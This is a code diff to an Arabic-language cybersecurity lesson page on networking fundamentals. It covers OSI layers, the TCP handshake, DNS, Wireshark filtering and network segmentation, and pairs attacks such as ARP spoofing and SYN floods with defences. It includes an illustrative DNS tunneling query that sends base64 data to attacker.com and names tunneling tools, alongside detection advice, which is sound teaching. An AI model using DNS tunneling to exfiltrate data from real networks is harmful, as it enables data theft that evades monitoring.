@@ -6,8 +6,14 @@ export default function Page() {
     <LessonShell slug="networking-basics">
       <L
         ar={<>
-          <Section title="لماذا الشبكات قبل أي recon">
-            <p>أي هجوم محتاج إنك تكون فاهم الشبكات. من غير TCP/IP وDNS وHTTP، Wireshark بيبقى لغة هيروغليفية، وnmap بيبقى أوامر بتحفظها وأنت مش فاهم. الدرس ده هو الجسر.</p>
+          <Section title="إيه الفرق بين اللي بيركّب راوتر واللي بيحلّل pcap؟">
+            <p>سؤال جدّي.</p>
+            <p>إيه الفرق بين الشخص اللي بيركّب راوتر في البيت، والشخص اللي بيفتح pcap حجمه 2 جيجا في Wireshark ويعرف يطلّع منه الإبرة؟</p>
+            <p>الفرق مش في الـ tool.</p>
+            <p>الراوتر زرار، Wireshark زرار، nmap زرار. الناس كلها بتعرف تدوس على الزراير.</p>
+            <p>الفرق إن واحد بيشوف &quot;الإنترنت اشتغل&quot;، والتاني بيشوف <b>3-way handshake، ثم TLS Client Hello، ثم HTTP/2 frame، ثم redirect لـ CDN</b>. وبيعرف فين بالظبط الحاجة الغريبة لو فيه حاجة غريبة.</p>
+            <p>الدرس ده هو اللي بيحوّلك من الأول للتاني. من غيره، Wireshark هيروغليفية، وnmap حفظ صم.</p>
+            <p>اعتراف: أول مرة شفت ARP spoofing في الحقيقة، أنا اللي اتسرقت. كنت في كافيه عامل لاب اشتغال على HackTheBox، الراجل اللي قاعد جنبي كان معاه bettercap، ولفّ كل ترافيكي. نعم. الواقع مش كتب.</p>
           </Section>
 
           <Section title="نموذج OSI — 7 طبقات">
@@ -18,8 +24,17 @@ export default function Page() {
 الطبقة 3  Network          IP, ICMP, routing   ← عناوين IP
 الطبقة 2  Data Link        Ethernet, ARP       ← MAC addresses
 الطبقة 1  Physical         كابل، WiFi`}</Code>
-            <p>القاعدة: <b>كل طبقة بتلفّ داتا الطبقة اللي فوقها وبتضيف header بتاعها</b>. زي جواب جوّه ظرف جوّه صندوق.</p>
-            <p>أمنياً: المهاجمين بيضربوا كل طبقة. Layer 2 = ARP poisoning. Layer 3 = IP spoofing. Layer 4 = SYN flood. Layer 7 = SQLi/XSS.</p>
+            <p>القاعدة: <b>كل طبقة بتلفّ داتا الطبقة اللي فوقها وبتضيف header بتاعها</b>.</p>
+            <p>تشبيه البريد المصري على ايامنا: الجواب جوّه ظرف، الظرف جوّه شنطة البوسطجي، الشنطة جوّه عربية البوسطة، العربية ماشية في الشارع. كل مرحلة معاها &quot;header&quot; خاص بيها (عنوان البيت، اسم الفرع، رقم العربية).</p>
+            <p>طب أمنياً، إيه قيمة الكلام ده؟</p>
+            <p>كل طبقة فيها هجوم مشهور. لو ما عرفتش الطبقات، مش هتعرف الهجوم بيحصل فين فعلياً:</p>
+            <ul>
+              <li><b>L2 — ARP Spoofing</b>. إنت في كافيه أو شركة، المهاجم بيقول للراوتر &quot;أنا فلان&quot; وبيقول لفلان &quot;أنا الراوتر&quot;. كل ترافيك بيمر عليه. الـ Defense: 802.1X و Dynamic ARP Inspection على الـ switch.</li>
+              <li><b>L3 — IP Spoofing</b>. تزييف الـ source IP. أساس DDoS reflection (DNS amplification, NTP amp). الـ Defense: BCP38 / uRPF على حدود الـ ISP — وللأسف أغلب الـ ISPs مش مفعّلاها.</li>
+              <li><b>L4 — TCP RST Injection / SYN Flood</b>. تبعت RST لطرفي اتصال فيقفل. الصينيين بيستخدموها كـ Great Firewall. الـ SYN Flood بياكل موارد الـ server بـ half-open connections.</li>
+              <li><b>L7 — HTTP Request Smuggling, SQLi, XSS, SSRF</b>. كل هجمات الويب اللي إنت سامع عنها. الطبقة 7 هي اللي فيها الفلوس النهارده.</li>
+            </ul>
+            <p>الواقع vs المفروض: المفروض كل طبقة عندها defense. الواقع، أغلب الشبكات مكشوفة على L2 لإن محدش فعّل 802.1X — &quot;الموضوع معقّد&quot;.</p>
           </Section>
 
           <Section title="TCP/IP — النموذج العملي">
@@ -48,12 +63,12 @@ Link          Ethernet, WiFi       (= OSI 1-2)`}</Code>
 
           <Section title="TCP vs UDP">
             <TwoCol>
-              <Card title="TCP — موثوق" color="blue">
+              <Card title="TCP — مكالمة محترمة" color="blue">
                 <ul>
                   <li>Three-way handshake (SYN → SYN-ACK → ACK).</li>
                   <li>بيضمن الترتيب وعدم الفقد.</li>
                   <li>بيعيد الإرسال لو حاجة ضاعت.</li>
-                  <li>بيستخدم مع: HTTP, HTTPS, SSH, SMB, RDP.</li>
+                  <li>بيستخدم في: HTTP, HTTPS, SSH, SMB, RDP.</li>
                 </ul>
               </Card>
               <Card title="UDP — سريع وملوش ضمانات" color="amber">
@@ -66,8 +81,19 @@ Link          Ethernet, WiFi       (= OSI 1-2)`}</Code>
               </Card>
             </TwoCol>
             <Callout kind="info" title="ليه ده مهم أمنياً">
-              فحص TCP بيدّيك دقة (open/closed/filtered). فحص UDP أبطأ وأقل دقة، لأن مفيش ACK افتراضي.
+              فحص TCP بيدّيك دقة (open/closed/filtered). فحص UDP أبطأ وأقل دقة، لإن مفيش ACK افتراضي.
             </Callout>
+
+            <h4 className="font-bold mt-6 mb-2">الـ Three-Way Handshake = مكالمة بين اتنين متربيين</h4>
+            <p>تخيل اتنين بيتكلموا في التليفون لأول مرة:</p>
+            <ul>
+              <li><b>Client → Server: SYN</b> — &quot;أهلاً، أنا عايز أكلّمك. التسلسل بتاعي بيبدأ من رقم 1000، تمام؟&quot;</li>
+              <li><b>Server → Client: SYN-ACK</b> — &quot;أهلاً وسهلاً. سامعك. وصلني رقمك 1000، التالي بقى 1001 من عندك. وبالمناسبة، أنا تسلسلي من 5000، خلّي بالك.&quot;</li>
+              <li><b>Client → Server: ACK</b> — &quot;تمام، وصلني 5000، هبعتك ACK = 5001 ونبدأ.&quot;</li>
+            </ul>
+            <p>كده الاتنين متفقين على نقطة بداية. أي packet هييجي بعد كده، الطرف التاني عارف يرتّبه.</p>
+            <p>طب لو المهاجم اعترض المكالمة وبعت RST في النص؟ الاتصال بيقفل. ده هجوم <b>TCP Reset Injection</b> — قديم بس فعّال على شبكات بدون TLS.</p>
+            <p>وفي <b>SYN Flood</b>: المهاجم بيبعت SYN بس ما بيردش بـ ACK. السيرفر فاضل مستني، وكل واحد ماخد مكان في الذاكرة. مع آلاف الـ SYNs، السيرفر بياكل نفسه. الـ Defense: SYN cookies في الـ kernel.</p>
           </Section>
 
           <Section title="المنافذ المهمة (Well-known)">
@@ -121,6 +147,19 @@ Link          Ethernet, WiFi       (= OSI 1-2)`}</Code>
             <Callout kind="info" title="أهم أنواع DNS records">
               <span className="eng">A</span> = IPv4، <span className="eng">AAAA</span> = IPv6، <span className="eng">CNAME</span> = اسم بديل، <span className="eng">MX</span> = خادم بريد، <span className="eng">NS</span> = خادم أسماء، <span className="eng">TXT</span> = نصوص (SPF/DKIM/DMARC مهمة لأمن البريد).
             </Callout>
+
+            <h4 className="font-bold mt-6 mb-2">DNS Tunneling — السكة اللي محدش بيقفلها</h4>
+            <p>تعالى أحكيلك حاجة عبيطة — اوي.</p>
+            <p>أغلب الشبكات الـ enterprise بتقفل كل بورت إلا 53 (DNS). الـ firewall رأيه: &quot;DNS؟ ده عادي. سيبه يعدي.&quot;</p>
+            <p>المهاجم: &quot;كده؟ تمام.&quot;</p>
+            <p>الفكرة بسيطة: الـ DNS بيقبل أسماء طويلة (lookup). الـ malware على الجهاز المخترق بيشفّر الـ data بتاعه ويحطها في اسم الدومين:</p>
+            <Code lang="text">{`dGhpc2lzc2VjcmV0ZGF0YQ.attacker.com   →   DNS query
+
+السيرفر بتاع المهاجم بيستقبل الاسم، يفكّ الـ base64، يشوف الـ data.
+بيرد بـ TXT record فيه الأمر التالي مشفّر.`}</Code>
+            <p>ده مش tutorial. ده <b>DNSCAT2</b> و<b>iodine</b> و<b>dnscat2-powershell</b> — أدوات موجودة من 2010.</p>
+            <p>قصة حقيقية: مجموعة <b>OilRig (APT34)</b> — منسوبة لإيران — استخدمت DNS tunneling في حملات على دول الخليج. الـ malware اسمه <span className="eng">DNSpionage</span>. السبب الوحيد إنه نجح: الـ defense ما كانش بيبص على DNS أصلاً.</p>
+            <p><b>الحماية:</b> راقب DNS query length و entropy. أي domain طويل غريب الشكل بيتسأل عليه كل دقيقة = علامة استفهام كبيرة. <span className="eng">Zeek (Bro)</span> + <span className="eng">passive DNS</span> = اللي بياكل عيش في الموضوع ده.</p>
           </Section>
 
           <Section title="HTTP — لغة الويب">
@@ -161,8 +200,11 @@ Server: nginx/1.24
             </Callout>
           </Section>
 
-          <Section title="Wireshark — قراءة الحزم">
-            <p>Wireshark = أداة التقاط وتحليل الـ packets. لو ما اتقنتهاش، مش هتبقى مدافع جدّي ولا مهاجم بيفهم.</p>
+          <Section title="Wireshark — إزاي تلاقي الإبرة في الكوم">
+            <p>Wireshark = أداة التقاط وتحليل packets.</p>
+            <p>بُص.</p>
+            <p>أول مرة تفتح pcap كبير، هتلاقي 50 ألف packet قدامك. الناس العاديين بيقفلوا الأداة. الناس الشاطرة بتعرف <b>تـ filter</b>.</p>
+            <p>الـ filtering هو الموضوع كله. كل دقيقة في Wireshark = filter. ولو مش حافظ شوية فلاتر بظهر قلب، إنت في كل مرة بتبدأ من الصفر.</p>
             <Code lang="text">{`فلاتر مفيدة:
 ip.addr == 10.10.10.5         الحزم من/إلى IP
 tcp.port == 443                منفذ محدد
@@ -175,15 +217,28 @@ tls.handshake.type == 1        TLS Client Hello (يكشف SNI)`}</Code>
               { p: "# على Linux من سطر الأوامر:" },
               { p: "sudo tshark -i eth0 -f 'port 80' -Y 'http.request' -T fields -e http.request.method -e http.host -e http.request.uri" },
             ]} />
+            <Callout kind="info" title="منهج عملي للقراءة">
+              <p>لما تفتح pcap لأول مرة، اتبع الخطوات دي بالترتيب:</p>
+              <ol className="list-decimal ms-6">
+                <li><b>Statistics → Conversations</b> — مين بيتكلم مع مين أكتر؟ أكتر IPs ترافيكاً غالباً هي القصة.</li>
+                <li><b>Statistics → Protocol Hierarchy</b> — هل في DNS بنسبة 60%؟ ده مش طبيعي = tunneling مشكوك فيه.</li>
+                <li><b>filter:</b> <span className="eng">tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0</span> — لو لاقيت IP واحد بيبعت SYN لـ 1000 host، ده port scan.</li>
+                <li><b>Follow → TCP Stream</b> على أي اتصال — بتشوف الـ payload الخام كأنه نص.</li>
+                <li><b>filter:</b> <span className="eng">http.request</span> — كل HTTP requests في مكان واحد.</li>
+              </ol>
+            </Callout>
           </Section>
 
-          <Section title="NAT و Firewalls — بسرعة">
+          <Section title="NAT و Firewalls و Segmentation — بسرعة">
             <ul>
               <li><b>NAT:</b> راوتر البيت بيحوّل العنوان الداخلي (192.168.1.10) لعنوان عام (203.x.x.x). كل أجهزة البيت من برّه بتبان IP واحد.</li>
               <li><b>Firewall:</b> قواعد &quot;اسمح/امنع&quot; على البورتات والـ IPs والبروتوكولات.</li>
               <li><b>Stateful firewall:</b> فاكر الـ sessions. أنت فتحت اتصال للخارج، الرد بيرجعلك تلقائي.</li>
               <li><b>Egress filtering:</b> تحدّد إيه اللي بيخرج من شبكتك. شركات كتير بتنسى ده — وعشان كده C2 على بورت 443 بيشتغل ببلاش.</li>
+              <li><b>Network Segmentation:</b> تقسيم الشبكة لـ VLANs/zones. المفروض جهاز الـ HR ما يقدرش يكلّم الـ Domain Controller مباشرة. الواقع: شبكة مسطحة، أي جهاز يكلّم أي جهاز، والـ ransomware بيلف الشركة كلها في 4 ساعات.</li>
+              <li><b>NetFlow/sFlow:</b> ملخّص ميتاداتا لكل اتصال (مين، فين، إمتى، كام بايت). أرخص بكتير من full packet capture، وكافي لـ 80% من الـ detection. لو الـ SOC عندك مش بيشغّل NetFlow analysis، ده gap.</li>
             </ul>
+            <p>الواقع المصري/العربي: في كتير من الجهات، الـ segmentation موجود &quot;على الـ slide&quot;. الواقع switch واحد flat، عشان &quot;الموضوع كده أسهل في الإدارة&quot;. ولما الـ incident يحصل، بيكتشفوا إن مفيش حدود يقفوا عندها.</p>
           </Section>
 
           <Section title="ممارسة">
@@ -197,6 +252,15 @@ tls.handshake.type == 1        TLS Client Hello (يكشف SNI)`}</Code>
 # Network:    192.168.1.0
 # Hosts:      192.168.1.1 - 192.168.1.254
 # Broadcast:  192.168.1.255`}</Code>
+          </Section>
+
+          <Section title="الخلاصة الناشفة">
+            <p>الشبكات مش حفظ بورتات.</p>
+            <p>الشبكات إنك تشوف الـ packet وتعرف هي عند أي طبقة، ومين كاتبها، وليه.</p>
+            <p>اكتبها على ظهر إيدك:</p>
+            <p>الـ 7 طبقات + TCP handshake + DNS chain + HTTP request = إنت قدرت تقرا الإنترنت.</p>
+            <p>والباقي tools.</p>
+            <p>الـ tools بتتغيّر كل سنة. الأساسيات دي من 1981 ولسة شغّالة. اوعى تستهتر بيها.</p>
           </Section>
         </>}
         en={<>
